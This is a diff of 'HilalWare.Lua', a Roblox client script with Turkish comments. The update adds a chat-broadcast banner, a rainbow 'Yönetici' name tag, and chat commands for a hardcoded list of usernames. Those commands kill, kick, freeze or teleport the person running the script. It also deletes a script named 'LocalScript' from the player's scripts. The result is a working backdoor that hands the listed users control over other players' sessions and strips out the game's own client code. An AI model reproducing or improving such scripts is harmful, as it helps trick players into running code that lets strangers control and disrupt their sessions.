@@ -1,8 +1,32 @@
-v2
+-- v3
+
 
 local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+
+local message = "By HilalWare.Lua | Eski Sürüm → Yeni Sürüm"
+
+local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+if channel then
+    channel:SendAsync(message)
+else
+    pcall(function()
+        StarterGui:SetCore("ChatMakeSystemMessage", {
+            Text = message,
+            Color = Color3.fromRGB(255, 0, 0),
+            Font = Enum.Font.GothamBold,
+            TextSize = 18
+        })
+    end)
+end
+
+
+-- Admin kodu
+local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
 
+-- Yetkililer
 local allowedUsers = {
     ["q692q"] = true,
     ["muhammet_bekir2004"] = true,
@@ -12,14 +36,7 @@ local allowedUsers = {
 
 local frozen = false
 
-local function setAnchoredAllParts(char, anchored)
-    for _, part in ipairs(char:GetDescendants()) do
-        if part:IsA("BasePart") then
-            part.Anchored = anchored
-        end
-    end
-end
-
+-- Yönetici etiketi
 local function addAdminTag(player)
     local function onCharacterAdded(character)
         local head = character:WaitForChild("Head", 5)
@@ -34,48 +51,19 @@ local function addAdminTag(player)
             local textLabel = Instance.new("TextLabel")
             textLabel.Size = UDim2.new(1, 0, 1, 0)
             textLabel.BackgroundTransparency = 1
-            textLabel.Text = "Admin"
+            textLabel.Text = "Yönetici"
+            textLabel.TextStrokeTransparency = 0
             textLabel.TextScaled = true
             textLabel.Font = Enum.Font.GothamBold
             textLabel.Parent = billboard
 
-            -- HSV → RGB fonksiyonu
-            local function HSVtoRGB(h, s, v)
-                local c = v * s
-                local x = c * (1 - math.abs((h * 6) % 2 - 1))
-                local m = v - c
-                local r, g, b = 0, 0, 0
-
-                if 0 <= h and h < 1/6 then
-                    r, g, b = c, x, 0
-                elseif 1/6 <= h and h < 2/6 then
-                    r, g, b = x, c, 0
-                elseif 2/6 <= h and h < 3/6 then
-                    r, g, b = 0, c, x
-                elseif 3/6 <= h and h < 4/6 then
-                    r, g, b = 0, x, c
-                elseif 4/6 <= h and h < 5/6 then
-                    r, g, b = x, 0, c
-                elseif 5/6 <= h and h < 1 then
-                    r, g, b = c, 0, x
-                end
-
-                return Color3.new(r + m, g + m, b + m)
-            end
-
-            -- Renk geçişi ayarları
-            local hue = 0
-            local speed = 0.1 -- geçiş hızı (düşük değer = yavaş)
-
-            local connection
-            connection = RunService.RenderStepped:Connect(function(dt)
-                hue = (hue + dt * speed) % 1
-                textLabel.TextColor3 = HSVtoRGB(hue, 1, 1)
-            end)
-
-            character.AncestryChanged:Connect(function()
-                if not character:IsDescendantOf(game) then
-                    connection:Disconnect()
+            -- RGB animasyonu
+            task.spawn(function()
+                local hue = 0
+                while textLabel.Parent do
+                    hue = (hue + 1) % 360
+                    textLabel.TextColor3 = Color3.fromHSV(hue / 360, 1, 1)
+                    task.wait()
                 end
             end)
         end
@@ -87,40 +75,43 @@ local function addAdminTag(player)
     end
 end
 
+-- Karakterin tüm parçalarını dondur / çöz
+local function setAnchoredAllParts(char, anchored)
+    for _, part in ipairs(char:GetDescendants()) do
+        if part:IsA("BasePart") then
+            part.Anchored = anchored
+        end
+    end
+end
+
+-- Komutlar
 local function setupCommands(player)
     player.Chatted:Connect(function(message)
         message = string.lower(message)
 
         if message == "/kill" then
-            if player.Character and player.Character:FindFirstChild("Humanoid") then
-                player.Character.Humanoid.Health = 0
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
+                LocalPlayer.Character.Humanoid.Health = 0
             end
 
         elseif message == "/kick" then
-            player:Kick("Yetkili tarafından oyundan atıldınız.")
+            LocalPlayer:Kick("Yetkili tarafından oyundan atıldınız.")
 
         elseif message == "/freeze" then
-            if player.Character then
+            if LocalPlayer.Character then
                 frozen = true
-                setAnchoredAllParts(player.Character, true)
+                setAnchoredAllParts(LocalPlayer.Character, true)
             end
 
         elseif message == "/unfreeze" then
-            if player.Character then
+            if LocalPlayer.Character then
                 frozen = false
-                setAnchoredAllParts(player.Character, false)
+                setAnchoredAllParts(LocalPlayer.Character, false)
             end
 
         elseif message == "/bring" then
-            local localPlayer = Players.LocalPlayer
-            if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                localPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
-            end
-
-        elseif message == "/goto" then
-            local localPlayer = Players.LocalPlayer
-            if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-                player.Character.HumanoidRootPart.CFrame = localPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
             end
         end
     end)
@@ -140,12 +131,11 @@ for _, player in ipairs(Players:GetPlayers()) do
     end
 end
 
--- LocalScript silme kısmı (opsiyonel)
-local player = Players.LocalPlayer
+-- LocalScript silme
+local player = game.Players.LocalPlayer
 local targetScriptName = "LocalScript"
 
 local targetScript = player:FindFirstChild("PlayerScripts") and player.PlayerScripts:FindFirstChild(targetScriptName)
-
 if targetScript then
     targetScript:Destroy()
     print(targetScriptName .. " başarıyla silindi!")
